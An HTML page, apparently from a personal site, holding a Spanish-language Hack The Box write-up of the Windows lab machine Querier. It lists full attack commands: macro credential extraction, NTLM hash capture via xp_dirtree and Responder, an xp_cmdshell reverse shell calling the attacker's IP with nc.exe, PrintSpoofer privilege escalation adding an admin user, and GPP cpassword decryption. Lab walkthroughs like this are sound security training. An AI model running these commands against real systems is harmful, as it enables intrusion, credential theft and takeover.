@@ -1,0 +1,155 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Querier HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/querier/pasted-20260317113044.png" alt="Querier HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Querier</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>macros</span>
+            <span>office_macros</span>
+            <span>strings_olevba</span>
+            <span>xp_dirtree</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Shares SMB accesibles y fichero Office con macros</li>
+            <li><code>Explotación</code>: Extracción de credenciales desde macros con olevba/strings</li>
+            <li><code>Movimiento lateral</code>: MSSQL autenticado fuerza NTLM hacia Responder y se crackea el hash</li>
+            <li><code>Explotación</code>: MSSQL permite activar <code>xp_cmdshell</code> y obtener shell</li>
+            <li><code>Escalada de Privilegios</code>: <code>groups.xml</code> expone cpassword y PrintSpoofer permite SYSTEM</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/querier/pasted-20260317115408.png" alt="Querier HTB" />
+          <div class="code-card">
+            <h3>Enumerar shares anónimo</h3>
+            <pre><code>smbclient -L 10.129.10.194 -N
+smbclient //querier/Reports/ -N -c "recurse; prompt; mget *;"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/querier/pasted-20260317115453.png" alt="Querier HTB" />
+          <img class="writeup-image" src="/writeups/assets/querier/pasted-20260317124105.png" alt="Querier HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Leer Macros del binario office</h2>
+          <div class="code-card">
+            <h3>Leer macroos del binario</h3>
+            <pre><code>olevba Currency\ Volume\ Report.xlsm
+# Credenciales: reporting:PcwTWTHRwryjc$c6</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/querier/pasted-20260317124325.png" alt="Querier HTB" />
+          <div class="code-card">
+            <h3>Acceso MSSQL</h3>
+            <pre><code>impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@querier -windows-auth</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Capturar hash NTLMv2</h3>
+            <pre><code># Kali
+responder -I tun0 -v
+# MSSQL
+EXEC xp_dirtree '\\10.10.16.69\test'</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/querier/pasted-20260317125327.png" alt="Querier HTB" />
+          <div class="code-card">
+            <h3>Crackear Hash</h3>
+            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Credenciales -&gt; MSSQL-svc:corporate568</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Validar Credenciales</h3>
+            <pre><code>netexec SMB querier -u 'MSSQL-svc' -p corporate568 --local-auth</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/querier/pasted-20260317125656.png" alt="Querier HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <div class="code-card">
+            <h3>Acceso MSSQL</h3>
+            <pre><code>impacket-mssqlclient MSSQL-svc:'corporate568'@querier -windows-auth</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Activar xp_cmdshell</h3>
+            <pre><code># MSSQL
+enable_xp_cmdshell</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Reverse shell</h3>
+            <pre><code># Kali: Hostear nc.exe
+impacket-smbserver SMB $(pwd) -smb2support
+# Kali: Listener
+penelope -p 4444
+# MSSQL
+EXEC xp_cmdshell "\\10.10.16.69\SMB\nc.exe 10.10.16.69 4444 -e cmd"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/querier/pasted-20260317131402.png" alt="Querier HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Impersonate</h2>
+          <div class="code-card">
+            <h3>Impersonate Windows 2019</h3>
+            <pre><code>\\10.10.16.69\SMB\PrintSpoofer.exe -c "net user add alvaro ruyz123$! /add"
+
+\\10.10.16.69\SMB\PrintSpoofer.exe -c "net localgroup Administrators alvaro /add"
+
+\\10.10.16.69\SMB\PrintSpoofer.exe -c "reg add  HKLM\Software\Microsoft\Windows\Currentversión\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/querier/pasted-20260317133810.png" alt="Querier HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: SYSVOL manual</h2>
+          <div class="code-card">
+            <h3>Buscar la cadena cpassword</h3>
+            <pre><code>findstr /SIM /C:"cpassword" *.txt *.xml</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/querier/pasted-20260317135220.png" alt="Querier HTB" />
+          <div class="code-card">
+            <h3>Leer fichero</h3>
+            <pre><code>type "ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"
+# cpassword="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/querier/pasted-20260317135319.png" alt="Querier HTB" />
+          <div class="code-card">
+            <h3>Desencriptar cpassword</h3>
+            <pre><code>gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
+
+# Contraseña: MyUnclesAreMarioAndLuigi!!1!</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/querier/pasted-20260317135459.png" alt="Querier HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>macros</span>
+            <span>office_macros</span>
+            <span>strings_olevba</span>
+            <span>xp_dirtree</span>
+            <span>responder</span>
+            <span>local-auth</span>
+            <span>impersonación</span>
+            <span>PrintSpoofer</span>
+            <span>sysvol</span>
+            <span>cpassword</span>
+            <span>groups_xml</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
